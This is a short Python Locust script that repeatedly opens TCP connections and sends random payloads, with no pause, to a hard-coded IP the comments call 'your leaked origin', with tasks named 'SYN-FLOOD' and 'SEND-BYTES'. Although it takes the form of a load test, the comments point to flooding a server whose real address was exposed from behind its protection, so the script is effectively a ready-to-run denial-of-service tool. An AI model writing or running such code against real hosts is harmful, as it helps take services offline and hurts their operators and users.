# locustfile_tcp_power.py
from gevent import monkey
monkey.patch_all()

import socket
import time
import random
import string
from locust import User, task, constant, events

TARGET_IP   = "192.173.173.42"   # your leaked origin
TARGET_PORT = 443             # change to the port you want to stress

def random_payload(length=128):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length)).encode()

class TCPPowerUser(User):
    wait_time = constant(0)  # no pause between tasks

    @task(7)
    def tcp_connect_only(self):
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        error = None
        try:
            sock.connect((TARGET_IP, TARGET_PORT))
        except Exception as e:
            error = e
        finally:
            sock.close()
        elapsed = int((time.time() - start) * 1000)
        events.request.fire(
            request_type="TCP-CONNECT",
            name="SYN-FLOOD",
            response_time=elapsed,
            response_length=0,
            exception=error,
        )

    @task(3)
    def tcp_send_payload(self):
        payload = random_payload(random.randint(64, 512))
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        error = None
        try:
            sock.connect((TARGET_IP, TARGET_PORT))
            sock.sendall(payload)
        except Exception as e:
            error = e
        finally:
            sock.close()
        elapsed = int((time.time() - start) * 1000)
        events.request.fire(
            request_type="TCP-PAYLOAD",
            name="SEND-BYTES",
            response_time=elapsed,
            response_length=len(payload),
            exception=error,
        )
